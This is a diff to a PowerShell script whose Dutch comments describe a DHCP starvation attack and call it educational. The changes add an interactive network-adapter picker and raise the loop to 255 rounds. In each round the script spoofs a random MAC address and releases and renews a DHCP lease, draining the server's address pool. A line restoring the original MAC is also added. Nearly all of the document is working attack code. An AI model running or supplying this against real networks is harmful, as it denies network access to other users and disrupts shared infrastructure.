@@ -14,15 +14,29 @@
 # DHCP Leases worden uitgedeeld tot de DHCP server geen LEASES meer kan geven (de starvation).
 # Script is bedoeld voor Educatieve Doeleinden.
 
-$NetAdapterName = "" # Voorbeeld    $NetAdapterName = "Ethernet"
+$NetAdapter = ""
+$Attacks = 255
 
-for ($i = 0;$i -lt 10;$i++){
+While ($true){
+    cls
+    Get-NetAdapter | Format-Table -Property InterfaceIndex, Name, Status, MacAddress, ifAlias
+    $InterfaceIndex = Read-Host -Prompt "Vul de gewenste InterfaceIndex nummer in "
+    $NetAdapter = Get-NetAdapter -InterfaceIndex $InterfaceIndex
+    if ($NetAdapter -ne $null){
+        break
+    }
+}
+
+
+for ($i = 0;$i -lt $Attacks;$i++){
     $bit1 = Get-Random -Minimum 0 -Maximum 9
     $bit2 = Get-Random -Minimum 0 -Maximum 9
     $randomMAC = ([string]::Format("{0:X2}:{1:X2}:{2:X2}:{3:X2}:{4:X2}:{5:X2}", (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255)))
-    Set-NetAdapter -Name $NetAdapterName -MacAddress $randomMAC -Confirm:$false
+    Set-NetAdapter -Name $NetAdapter.Name -MacAddress $randomMAC -Confirm:$false
     Invoke-Expression -Command "ipconfig /release" #DHCP Release
     Invoke-Expression -Command "ipconfig /renew"   #DHCP Renew
     Start-Sleep -Seconds 2
 }
 
+#Restore Original Mac-Address
+Set-NetAdapter -Name $NetAdapter.Name -MacAddress $NetAdapter.MacAddress -Confirm:$false
